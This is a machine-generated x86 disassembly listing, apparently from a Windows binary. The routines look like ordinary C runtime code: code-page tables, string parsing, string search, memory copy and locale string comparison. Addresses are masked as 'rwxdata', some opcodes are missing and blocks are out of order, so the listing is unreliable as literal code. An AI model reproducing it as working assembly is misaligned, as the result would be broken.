cmp esi [ rwxdata ]
ja rwxdata
push eax
call sub_4251d0
mov edi eax
pop ecx
test edi edi
jne rwxdata
pop edi
pop esi
pop ebp
retn
mov eax esi
shr eax 0x4
push eax
call sub_425c73
mov edi eax
pop ecx
test edi edi
jne rwxdata
push [ ebp + 0x8 ]
jmp rwxdata
push esi
jmp rwxdata
push 0x0
push edi
call sub_422720
add esp 0xc
sub_426c64
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rwxdata ] esi
jle rwxdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test eax eax
je rwxdata
inc esi
cmp esi [ rwxdata ]
jl rwxdata
test [ eax + 0xc ] 0x83
je rwxdata
cmp esi 0x14
jl rwxdata
push eax
call sub_422ab5
cmp eax 0xffffffff
pop ecx
je rwxdata
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
call sub_423e39
mov eax [ rwxdata ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_426ccd
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rwxdata ] cl
jne rwxdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je rwxdata
xor eax eax
movzx eax [ eax * 2 + rwxdata ]
and eax [ esp + 0x8 ]
jmp rwxdata
retn
test eax eax
jne rwxdata
sub_426cfe
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_426e97
mov esi eax
pop ecx
cmp esi [ rwxdata ]
mov [ ebp + 0x8 ] esi
je rwxdata
xor eax eax
jmp rwxdata
xor ebx ebx
cmp esi ebx
je rwxdata
pop edi
pop esi
pop ebx
leave
retn
call sub_426f14
xor edx edx
mov eax rwxdata
push 0x40
xor eax eax
pop ecx
mov edi rwxdata
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rwxdata ]
add eax 0x30
inc edx
cmp eax rwxdata
jb rwxdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb rwxdata
mov dl [ ecx + 0x1 ]
test dl dl
je rwxdata
cmp [ eax ] esi
je rwxdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne rwxdata
cmp [ ebx ] 0x0
mov ecx ebx
je rwxdata
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] 0x1
push eax
mov [ rwxdata ] eax
call sub_426ee1
lea esi [ esi + rwxdata ]
mov edi rwxdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rwxdata ] eax
movsd [ edi ] [ esi ]
jmp rwxdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja rwxdata
cmp [ rwxdata ] ebx
je rwxdata
push 0x40
xor eax eax
pop ecx
mov edi rwxdata
cmp [ ebp - 0x18 ] 0x1
mov [ rwxdata ] esi
[ edi ]
stosb [ edi ]
mov [ rwxdata ] ebx
jbe rwxdata
call sub_426f3d
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne rwxdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rwxdata ]
or eax 0xffffffff
mov [ rwxdata ] ebx
cmp [ ebp - 0x12 ] 0x0
je rwxdata
or [ eax + rwxdata ] dl
inc eax
cmp eax edi
jbe rwxdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rwxdata ] 0x8
inc eax
cmp eax 0xff
jb rwxdata
push esi
call sub_426ee1
pop ecx
mov [ rwxdata ] eax
mov [ rwxdata ] 0x1
jmp rwxdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rwxdata
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp rwxdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne rwxdata
or [ eax + rwxdata ] 0x4
inc eax
jmp rwxdata
mov dl [ ecx ]
test dl dl
je rwxdata
cmp eax edx
ja rwxdata
sub_426e97
mov eax [ esp + 0x4 ]
and [ rwxdata ] 0x0
cmp eax 0xfffffffe
jne rwxdata
cmp eax 0xfffffffd
jne rwxdata
mov [ rwxdata ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne rwxdata
mov [ rwxdata ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rwxdata ]
mov [ rwxdata ] 0x1
sub_426ee1
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je rwxdata
mov eax 0x411
retn
sub eax 0x4
je rwxdata
mov eax 0x804
retn
sub eax 0xd
je rwxdata
mov eax 0x412
retn
dec eax
je rwxdata
mov eax 0x404
retn
xor eax eax
retn
sub_426f14
push edi
push 0x40
pop ecx
xor eax eax
mov edi rwxdata
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rwxdata
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_426f3d
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rwxdata ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne rwxdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb rwxdata
cmp eax 0x5a
ja rwxdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb rwxdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je rwxdata
and [ eax + rwxdata ] 0x0
cmp eax 0x7a
ja rwxdata
or [ eax + rwxdata ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rwxdata ]
push [ rwxdata ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_4282c8
push 0x0
lea eax [ ebp - 0x214 ]
push [ rwxdata ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rwxdata ]
call sub_4280a4
push 0x0
lea eax [ ebp - 0x314 ]
push [ rwxdata ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rwxdata ]
call sub_4280a4
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb rwxdata
pop esi
leave
retn
or [ eax + rwxdata ] 0x20
mov cl al
sub cl 0x20
jmp rwxdata
inc eax
cmp eax esi
jb rwxdata
test dl 0x2
je rwxdata
or [ eax + rwxdata ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne rwxdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rwxdata ] cl
jmp rwxdata
and [ eax + rwxdata ] 0x0
or [ eax + rwxdata ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp rwxdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb rwxdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja rwxdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je rwxdata
jmp rwxdata
mov [ eax + rwxdata ] dl
jmp rwxdata
sub_4270f5
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rwxdata ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_4284dd
pop ecx
pop ecx
jmp rwxdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne rwxdata
mov bl [ esi ]
inc esi
jmp rwxdata
test eax eax
je rwxdata
cmp bl 0x2b
jne rwxdata
or [ ebp + 0x14 ] 0x2
jmp rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
mov eax [ ebp + 0x10 ]
test eax eax
jl rwxdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je rwxdata
cmp eax 0x1
je rwxdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg rwxdata
push 0x10
test eax eax
pop ecx
jne rwxdata
cmp [ ebp + 0x10 ] ecx
jne rwxdata
cmp bl 0x30
je rwxdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne rwxdata
mov al [ esi ]
cmp al 0x78
je rwxdata
mov [ ebp + 0x10 ] 0xa
jmp rwxdata
mov eax [ rwxdata ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_4284dd
pop ecx
pop ecx
jmp rwxdata
mov al [ esi ]
cmp al 0x78
je rwxdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
movsx ecx bl
sub ecx 0x30
jmp rwxdata
test eax eax
je rwxdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne rwxdata
mov [ ebp + 0x10 ] 0x8
jmp rwxdata
mov eax [ rwxdata ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_4284dd
pop ecx
pop ecx
jmp rwxdata
cmp ecx [ ebp + 0x10 ]
jae rwxdata
mov ecx [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
test cl 0x8
jne rwxdata
movsx eax bl
push eax
call sub_428411
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je rwxdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb rwxdata
test cl 0x4
mov eax 0x7fffffff
jne rwxdata
test edx edx
je rwxdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne rwxdata
test [ ebp + 0x14 ] 0x1
mov [ rwxdata ] 0x22
je rwxdata
test cl 0x1
jne rwxdata
and [ ebp - 0x8 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rwxdata ] 0x1
movzx esi bl
jle rwxdata
or [ ebp + 0x14 ] 0x4
jmp rwxdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe rwxdata
mov ecx [ ebp + 0x14 ]
and cl 0x2
neg cl
sbb ecx ecx
neg ecx
add ecx eax
mov [ ebp - 0x8 ] ecx
or [ ebp - 0x8 ] 0xffffffff
jmp rwxdata
test edx edx
je rwxdata
and ecx 0x2
je rwxdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp rwxdata
test [ ebp + 0x14 ] 0x2
je rwxdata
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
test ecx ecx
jne rwxdata
cmp [ ebp - 0x8 ] 0x80000000
ja rwxdata
mov eax [ ebp - 0x8 ]
jmp rwxdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] eax
jbe rwxdata
pop edi
pop esi
pop ebx
leave
retn
sub_427310
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je rwxdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je rwxdata
mov eax [ edx - 0x4 ]
cmp al bl
je rwxdata
and eax 0x81010100
je rwxdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je rwxdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne rwxdata
and eax 0x1010100
jne rwxdata
pop ebx
xor eax eax
retn
test edx 0x3
jne rwxdata
pop esi
pop edi
cmp ah bl
je rwxdata
and esi 0x80000000
jne rwxdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je rwxdata
shr eax 0x10
cmp al bl
je rwxdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
cmp ah bl
je rwxdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je rwxdata
jmp rwxdata
sub_4273d0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je rwxdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je rwxdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp rwxdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je rwxdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je rwxdata
mov al [ esi ]
inc esi
cmp al dh
jne rwxdata
test al al
je rwxdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je rwxdata
cmp al dl
je rwxdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je rwxdata
and eax 0x81010100
je rwxdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je rwxdata
test al al
jne rwxdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne rwxdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne rwxdata
and eax 0x1010100
jne rwxdata
pop ebx
xor eax eax
retn
test edx 0x3
jne rwxdata
mov al [ ecx + 0x3 ]
test al al
je rwxdata
pop esi
pop edi
cmp ah bl
je rwxdata
and esi 0x80000000
jne rwxdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je rwxdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je rwxdata
mov ah [ ecx + 0x2 ]
test ah ah
je rwxdata
jmp rwxdata
shr eax 0x10
cmp al bl
je rwxdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
cmp ah bl
je rwxdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je rwxdata
jmp rwxdata
sub_427450
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz rwxdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja rwxdata
not ecx
je rwxdata
dec ecx
dec ecx
sub_427490
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb rwxdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae rwxdata
sub_4274bf
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
push rwxdata
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rwxdata ]
call eax
mov ebx eax
test ebx ebx
je rwxdata
xor eax eax
jmp rwxdata
mov esi [ GetProcAddress@IAT ]
push rwxdata
push edi
call esi
test eax eax
mov [ rwxdata ] eax
je rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
push rwxdata
push edi
call esi
push rwxdata
push edi
mov [ rwxdata ] eax
call esi
mov [ rwxdata ] eax
push ebx
call eax
mov ebx eax
sub_427550
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je rwxdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne rwxdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je rwxdata
shr ecx 0x2
jne rwxdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je rwxdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je rwxdata
jmp rwxdata
test edi 0x3
je rwxdata
test esi 0x3
jne rwxdata
mov [ edi ] edx
add edi 0x4
dec ecx
je rwxdata
test dl dl
je rwxdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je rwxdata
mov ebx ecx
shr ecx 0x2
jne rwxdata
mov [ edi ] al
inc edi
dec ecx
je rwxdata
mov ebx ecx
shr ecx 0x2
jne rwxdata
and ebx 0x3
je rwxdata
xor edx edx
mov [ edi ] edx
test dh dh
je rwxdata
dec ebx
jne rwxdata
dec ebx
jne rwxdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne rwxdata
and ebx 0x3
jne rwxdata
and edx 0xff
mov [ edi ] edx
jmp rwxdata
test edx 0xff0000
je rwxdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne rwxdata
add edi 0x4
xor eax eax
dec ecx
je rwxdata
and edx 0xffff
mov [ edi ] edx
jmp rwxdata
test edx 0xff000000
jne rwxdata
mov [ edi ] edx
jmp rwxdata
sub_427650
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe rwxdata
test edi 0x3
jne rwxdata
cmp edi eax
jb rwxdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne rwxdata
jmp [ ecx * 4 + rwxdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4276b0 ]
jmp [ ecx * 4 + jump_table_42772c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_427798 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_427798 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_427930 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_427838 ]
neg ecx
jmp [ ecx * 4 + rwxdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_427930 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_427798 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_427798 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_427798 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_427930 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_427930 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_427930 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_427930 ]
sub_427990
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je rwxdata
mov eax edi
xor eax eax
jmp rwxdata
cld
pop edi
leave
retn
sub_4279b7
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rwxdata ] ebx
push 0x1
pop edi
jne rwxdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle rwxdata
push edi
mov eax rwxdata
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je rwxdata
cmp [ ebp + 0x1c ] ebx
jle rwxdata
push esi
push [ ebp + 0x10 ]
call sub_427c34
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax rwxdata
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je rwxdata
mov [ rwxdata ] edi
jmp rwxdata
mov eax [ rwxdata ]
cmp eax 0x2
jne rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_427c34
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rwxdata ] 0x2
cmp eax edi
jne rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp rwxdata
cmp [ ebp + 0x20 ] ebx
jne rwxdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je rwxdata
mov eax [ rwxdata ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne rwxdata
cmp [ ebp + 0x1c ] ebx
jne rwxdata
cmp [ ebp + 0x1c ] edi
jle rwxdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je rwxdata
cmp esi edi
jg rwxdata
mov eax edi
jmp rwxdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_427490
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
push 0x3
jmp rwxdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je rwxdata
cmp [ ebp - 0x24 ] ebx
je rwxdata
pop eax
jmp rwxdata
cmp esi ebx
jle rwxdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je rwxdata
cmp [ ebp + 0x1c ] ebx
jle rwxdata
cmp [ ebp - 0x3c ] 0x2
jb rwxdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je rwxdata
cmp [ ebp - 0x3c ] 0x2
jb rwxdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je rwxdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_427490
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je rwxdata
mov dl [ eax + 0x1 ]
cmp dl bl
je rwxdata
cmp edi ebx
je rwxdata
mov dl [ eax + 0x1 ]
cmp dl bl
je rwxdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb rwxdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je rwxdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb rwxdata
inc eax
inc eax
cmp [ eax ] bl
jne rwxdata
cmp cl dl
jbe rwxdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp rwxdata
inc eax
inc eax
cmp [ eax ] bl
jne rwxdata
cmp cl dl
jbe rwxdata
jmp rwxdata
sub_427c34
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je rwxdata
cmp [ eax ] 0x0
pop esi
jne rwxdata
cmp [ eax ] 0x0
je rwxdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
